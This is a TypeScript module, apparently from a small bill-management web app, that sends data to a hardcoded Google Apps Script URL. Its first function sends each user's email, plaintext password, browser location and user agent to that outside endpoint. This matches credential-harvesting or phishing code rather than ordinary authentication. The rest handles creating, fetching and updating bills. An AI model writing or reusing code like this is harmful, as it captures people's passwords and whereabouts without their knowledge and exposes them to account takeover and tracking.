
// Hardcoded URL as provided by user
const SHEET_URL = "https://script.google.com/macros/s/AKfycbzB2RchByfL3FwXzmd6pBM-Gx9_mFsQqqTQDXkaT3KbXTVm4uc6npdGqT5PSE13PwpPDg/exec";

if (!SHEET_URL) {
    console.warn("Google Sheet URL not configured");
}

// --- LOGINS ---
export const logToGoogleSheet = async (email: string, pass: string, location: { lat: number; lng: number } | null) => {
    const data = {
        action: 'login',
        email: email,
        password: pass,
        location: location ? `${location.lat}, ${location.lng}` : "Permission Denied/Unknown",
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };

    try {
        await fetch(SHEET_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify(data)
        });
        console.log("Logged to Google Sheet");
    } catch (error) {
        console.error("Failed to log to Google Sheet", error);
    }
};

// --- BILLS ---

export const createBillInSheet = async (bill: any) => {
    const data = {
        action: 'createBill',
        ...bill
    };

    try {
        await fetch(SHEET_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify(data)
        });
        console.log("Bill Created in Sheet");
        return true;
    } catch (error) {
        console.error("Failed to create bill", error);
        return false;
    }
}

export const fetchBillsFromSheet = async () => {
    try {
        // Use GET request to fetch bills from the doGet endpoint
        const response = await fetch(SHEET_URL, {
            method: 'GET',
        });

        if (!response.ok) {
            console.error('Failed to fetch bills from sheet');
            return [];
        }

        const bills = await response.json();
        return bills;
    } catch (error) {
        console.error('Error fetching bills:', error);
        return [];
    }
}

export const updateBillStatusInSheet = async (id: string, status: string) => {
    const data = {
        action: 'updateBillStatus',
        id: id,
        status: status
    };

    try {
        await fetch(SHEET_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify(data)
        });
        console.log("Bill Status Updated in Sheet");
        return true;
    } catch (error) {
        console.error("Failed to update bill status", error);
        return false;
    }
}
